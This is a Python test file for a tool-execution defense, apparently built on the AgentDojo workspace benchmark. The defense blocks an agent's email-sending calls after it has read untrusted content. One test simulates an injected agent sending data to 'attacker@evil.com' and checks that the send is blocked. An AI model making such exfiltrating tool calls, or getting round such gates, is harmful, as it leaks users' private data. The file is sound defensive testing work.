"""BatonToolsExecutor behavior on the real workspace suite, no LLM."""

import pytest
from agentdojo.agent_pipeline.tool_execution import ToolsExecutor
from agentdojo.functions_runtime import FunctionCall, FunctionsRuntime
from agentdojo.task_suite.load_suites import get_suite
from agentdojo.types import (
    ChatAssistantMessage,
    ChatUserMessage,
    text_content_block_from_string,
)

from baton_dojo.bridge import Call
from baton_dojo.contracts import load_table
from baton_dojo.defense import (
    EMPTY_FUNCTION_NAME_ERROR,
    INVALID_TOOL_ERROR_PREFIX,
    POLICY_BLOCK_SENTINEL,
    BatonToolsExecutor,
    derive_episode,
)

SUITE = get_suite("v1.2.2", "workspace")
TABLE = load_table("workspace")


def fresh():
    return FunctionsRuntime(SUITE.tools), SUITE.load_and_inject_default_environment({})


def user(text: str) -> ChatUserMessage:
    return ChatUserMessage(role="user", content=[text_content_block_from_string(text)])


def assistant(*calls: FunctionCall) -> ChatAssistantMessage:
    return ChatAssistantMessage(
        role="assistant",
        content=[text_content_block_from_string("")],
        tool_calls=list(calls),
    )


def run_executor(executor, messages):
    runtime, env = fresh()
    _, _, env, messages, _ = executor.query("q", runtime, env, messages, {})
    return env, messages


def executor(unknown_policy: str = "deny") -> BatonToolsExecutor:
    return BatonToolsExecutor(TABLE, unknown_policy)


def test_clean_read_is_executed():
    _, messages = run_executor(
        executor(),
        [user("what day is it?"), assistant(FunctionCall(function="get_current_day", args={}))],
    )
    result = messages[-1]
    assert result["role"] == "tool"
    assert result["error"] is None


def test_tainted_sink_is_blocked_and_not_executed():
    runtime, env = fresh()
    outbox_before = len(env.inbox.emails)
    messages = [
        user("summarize my unread emails"),
        assistant(FunctionCall(function="get_unread_emails", args={})),
    ]
    _, _, env, messages, _ = executor().query("q", runtime, env, messages, {})
    assert messages[-1]["error"] is None  # the read itself is fine

    messages = [
        *messages,
        assistant(
            FunctionCall(
                function="send_email",
                args={"recipients": ["attacker@evil.com"], "subject": "hi", "body": "data"},
            )
        ),
    ]
    _, _, env, messages, _ = executor().query("q", runtime, env, messages, {})
    result = messages[-1]
    assert result["error"] is not None and result["error"].startswith(POLICY_BLOCK_SENTINEL)
    assert len(env.inbox.emails) == outbox_before  # nothing was sent


def test_clean_sink_is_executed():
    env, messages = run_executor(
        executor(),
        [
            user("email bob"),
            assistant(
                FunctionCall(
                    function="send_email",
                    args={"recipients": ["bob@example.com"], "subject": "hi", "body": "yo"},
                )
            ),
        ],
    )
    assert messages[-1]["error"] is None


def test_string_list_args_are_coerced_before_gating():
    _, messages = run_executor(
        executor(),
        [
            user("email bob"),
            assistant(
                FunctionCall(
                    function="send_email",
                    args={
                        "recipients": "['bob@example.com']",
                        "subject": "hi",
                        "body": "yo",
                    },
                )
            ),
        ],
    )
    assert messages[-1]["error"] is None


def test_earlier_call_in_same_batch_taints_later_call():
    _, messages = run_executor(
        executor(),
        [
            user("read then send"),
            assistant(
                FunctionCall(function="get_unread_emails", args={}),
                FunctionCall(
                    function="send_email",
                    args={"recipients": ["bob@example.com"], "subject": "s", "body": "b"},
                ),
            ),
        ],
    )
    read_result, send_result = messages[-2], messages[-1]
    assert read_result["error"] is None
    assert send_result["error"].startswith(POLICY_BLOCK_SENTINEL)


def test_derive_episode_classification():
    runtime, env = fresh()
    exec_ = executor()
    messages = [
        user("do things"),
        assistant(
            FunctionCall(function="get_unread_emails", args={}),
            FunctionCall(function="not_a_tool", args={}),
            FunctionCall(function="get_file_by_id", args={}),  # missing arg -> runtime error
        ),
    ]
    _, _, env, messages, _ = exec_.query("q", runtime, env, messages, {})
    prompt, executed = derive_episode(messages, TABLE)
    assert prompt == "do things"
    # The invalid tool never executed; the runtime-errored call counts
    # (fail-closed: it may have touched the environment before failing).
    assert [call.tool for call in executed] == ["get_unread_emails", "get_file_by_id"]

    # A policy block joins the messages but never the episode.
    messages = [
        *messages,
        assistant(
            FunctionCall(
                function="send_email",
                args={"recipients": ["x@y.com"], "subject": "s", "body": "b"},
            )
        ),
    ]
    _, _, env, messages, _ = exec_.query("q", runtime, env, messages, {})
    assert messages[-1]["error"].startswith(POLICY_BLOCK_SENTINEL)
    _, executed = derive_episode(messages, TABLE)
    assert [call.tool for call in executed] == ["get_unread_emails", "get_file_by_id"]


def test_derive_episode_requires_a_user_message():
    with pytest.raises(ValueError):
        derive_episode([assistant()], TABLE)


def test_stock_error_strings_still_match_pinned_agentdojo():
    """Locks the never-executed error shapes to agentdojo==0.1.35 behavior."""
    runtime, env = fresh()
    stock = ToolsExecutor()
    messages = [
        user("x"),
        assistant(
            FunctionCall(function="<empty-function-name>", args={}),
            FunctionCall(function="not_a_tool", args={}),
        ),
    ]
    _, _, _, messages, _ = stock.query("q", runtime, env, messages, {})
    empty_result, invalid_result = messages[-2], messages[-1]
    assert empty_result["error"] == EMPTY_FUNCTION_NAME_ERROR
    assert invalid_result["error"].startswith(INVALID_TOOL_ERROR_PREFIX)


def test_recipients_reach_the_oracle():
    calls = derive_episode(
        [
            user("x"),
            *run_executor(
                executor(),
                [
                    user("email both"),
                    assistant(
                        FunctionCall(
                            function="send_email",
                            args={
                                "recipients": ["a@x.com", "b@x.com"],
                                "subject": "s",
                                "body": "b",
                            },
                        )
                    ),
                ],
            )[1][1:],
        ],
        TABLE,
    )[1]
    assert calls == [Call(tool="send_email", recipients=("a@x.com", "b@x.com"))]
